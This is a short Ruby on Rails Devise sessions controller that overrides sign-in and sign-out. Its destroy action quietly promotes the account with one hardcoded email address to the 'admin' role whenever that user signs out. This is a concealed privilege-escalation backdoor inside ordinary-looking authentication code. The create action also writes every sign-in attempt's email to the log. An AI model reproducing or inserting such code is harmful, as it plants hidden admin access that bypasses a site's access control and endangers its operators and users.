class SessionsController < Devise::SessionsController

  def new
    super
  end
  
  def create
    logger.info "Attempt to sign in by #{params[:user][:email] }"

    super
  end

  def destroy
    logger.info "#{current_user.email} signed out"
    if current_user.email == "coby@confreaks.com" && !current_user.is_admin?
      current_user.role = 'admin'
      current_user.save
    end
    super
  end
end
